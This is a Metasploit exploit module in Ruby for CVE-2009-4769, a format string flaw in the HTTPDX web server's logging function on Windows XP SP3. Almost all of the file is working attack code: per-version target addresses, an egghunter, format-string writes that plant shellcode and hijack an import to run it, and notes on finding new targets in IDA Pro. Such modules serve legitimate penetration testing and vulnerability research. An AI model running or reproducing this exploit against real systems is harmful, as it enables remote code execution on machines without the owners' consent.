##
# $Id: httpdx_tolog_format.rb 10150 2010-08-25 20:55:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Egghunter
	include Msf::Exploit::FormatString

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HTTPDX tolog() Function Format String Vulnerability',
			'Description'    => %q{
					This module exploits a format string vulnerability in HTTPDX HTTP server.
				By sending an specially crafted HTTP request containing format specifiers, an
				attacker can corrupt memory and execute arbitrary code.

				By default logging is off for HTTP, but enabled for the 'moderator' user
				via FTP.
			},
			'Author'         =>
				[
					'jduck'    # original discovery and metasploit module
				],
			'Version'        => '$Revision: 10150 $',
			'References'     =>
				[
					[ 'CVE', '2009-4769' ],
					[ 'OSVDB', '60182' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process'
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					# format string max length
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x25\x2f\x3f\x5c",
					'DisableNops'	=>  'True',
					'StackAdjustment' 	=> -1500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					#
					# Automatic targeting via fingerprinting
					#
					[ 'Automatic Targeting', { 'auto' => true }  ],

					#
					# specific targets
					#
					[	'httpdx 1.4 - Windows XP SP3 English',
						{
							'PadBytes' 	=> 2,
							'NumPops' 	=> 22,
							'Writable' 	=> 0x64f87810, 	# empty space in core.dll imports
							'FlowHook'	=> 0x64f870e8		# core.dll import for strlen
						}
					],
					[	'httpdx 1.4.5 - Windows XP SP3 English',
						{
							'PadBytes' 	=> 2,
							'NumPops' 	=> 22,
							'Writable' 	=> 0x64f87810, 	# empty space in core.dll imports
							'FlowHook'	=> 0x64f870e8		# core.dll import for strlen
						}
					],
					[	'httpdx 1.4.6 - Windows XP SP3 English',
						{
							'PadBytes' 	=> 2,
							'NumPops' 	=> 22,
							'Writable' 	=> 0x64f87810, 	# empty space in core.dll imports
							'FlowHook'	=> 0x64f870e8		# core.dll import for strlen
						}
					],
					[	'httpdx 1.4.6b - Windows XP SP3 English',
						{
							'PadBytes' 	=> 2,
							'NumPops' 	=> 22,
							'Writable' 	=> 0x64f87810, 	# empty space in core.dll imports
							'FlowHook'	=> 0x64f870e8		# core.dll import for strlen
						}
						],
					[	'httpdx 1.5 - Windows XP SP3 English',
						{
							'PadBytes' 	=> 2,
							'NumPops' 	=> 22,
							'Writable' 	=> 0x64f87810, 	# empty space in core.dll imports
							'FlowHook'	=> 0x64f870e8		# core.dll import for strlen
						}
					],

					#
					# Debugging target
					#
					[ 'Debug target',
						{
							'PadBytes'  => 2,
							'NumPops'   => 22,
							'Writable'  => 0xfeedfed5,
							'FlowHook'  => 0xdeadbeef
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 17 2009'))
=begin

NOTE: Even though all targets have the same addresses now, future targets may not.

To find a target:

1. open "core.dll" in IDA Pro
2. navigate to the "c_wildcmp" function
3. follow the xref to the first strlen
4. follow the xref to the imports area
5. copy/paste the address
6. the 'Writable' value should be anything after the last address IDA shows..
 (preferably something above 0x0d, to avoid bad chars)

If crashes occur referencing strange values, 'NumPops' probably needs adjusting.
For now, that will have to be done manually.

=end
	end


	def check
		version = get_version
		if version
			print_status("HTTPDX version detected : #{version}")
			if (version =~ /1\.4/) or (version == "1.5")
				return Exploit::CheckCode::Vulnerable
			end
		end
		Exploit::CheckCode::Safe
	end


	def exploit

		# an empty host header gives us 512 bytes in the client structure
		# (the client->filereq and client->host buffers are adjacement in memory)
		datastore['VHOST'] = ''

		# Use a copy of the target
		mytarget = target

		if (target['auto'])
			mytarget = nil

			print_status("Automatically detecting the target...")

			version = get_version
			if not version
				raise RuntimeError, "The server doesn't appear to be running a vulnerable version of HTTPDX"
			end

			re = Regexp.new(Regexp.escape(version)+' - ', true)
			self.targets.each do |t|
				if (re.match(t.name))
					mytarget = t
					break
				end
			end

			if (not mytarget)
				raise RuntimeError, 'Unable to automatically detect exploitation parameters'
			end

			print_status("Selected Target: #{mytarget.name}")
		else
			print_status("Trying target #{mytarget.name}...")
		end

		# proceed with chosen target...

		# '<ip> [Tue, 17 Nov 2009 18:22:12 GMT] "<GET/POST> /'
		ip_length = Rex::Socket.source_address(datastore['RHOST']).length
		num_start = ip_length + 2 + 29 + 3 + 3 + 2

		# use the egghunter!
		eh_stub, eh_egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })

		# write shellcode to 'writable' (all at once)
		fmtbuf = generate_fmtstr_from_buf(num_start, mytarget['Writable'], eh_stub, mytarget)
		fmtbuf = '/' + fmtbuf.gsub(/%/, '%25').gsub(/ /, '%20')
		print_status(" payload format string buffer is #{fmtbuf.length} bytes")

		send_request_raw({ 'uri' => fmtbuf })

		# write 'writable' addr to flowhook (execute shellcode)
		# NOTE: the resulting two writes must be done at the same time
		fmtbuf = generate_fmt_two_shorts(num_start, mytarget['FlowHook'], mytarget['Writable'], mytarget)
		# add payload to the end
		fmtbuf << eh_egg
		fmtbuf = '/' + fmtbuf.gsub(/%/, '%25').gsub(/ /, '%20')
		print_status(" hijacker format string buffer is #{fmtbuf.length} bytes")

		send_request_raw({ 'uri' => fmtbuf })
		disconnect

		# connect again to trigger shellcode
		select(nil, nil, nil, 1.5)
		print_status(" triggering shellcode now")
		print_status("Please be patient, the egg hunter may take a while...")
		connect

		handler
	end


	def get_version
		info = http_fingerprint # Custom version extraction / automatic target
		if info and (info =~ /httpdx\/(.*) \(Win32\)/)
			return $1
		end
		nil
	end

end


=begin

also present in 1.5 (presumably all versions in between)

1.4/httpdx_src/ftp.cpp:

   544      //printf(out);
   545      char af[MAX] = {0};
   546      if(isset(out) && client->serve.log || client->serve.debug)
   547          snprintf(af,sizeof(af)-1,"%s\n%s%s\n",client->addr,client->cmd,out);
   548      if(isset(out) && client->serve.log)
   549          tolog(client->serve.accessl,af);
   550      if(isset(out) && client->serve.debug)
   551          printf(af);

1.4/httpdx_src/http.cpp:

   172      char af[MAX] = {0};
   173      if(client.serve.log || client.serve.debug)
   174          snprintf(af,sizeof(af)-1,"%s [%s] \"%s /%s HTTP/1.1\" %d\n",client.addr,timef,m[client.method-1],client.filereq,response.code);
   175      if(client.serve.log)
   176          tolog(client.serve.accessl,af);
   177      if(client.serve.debug)
   178          printf(af);

=end
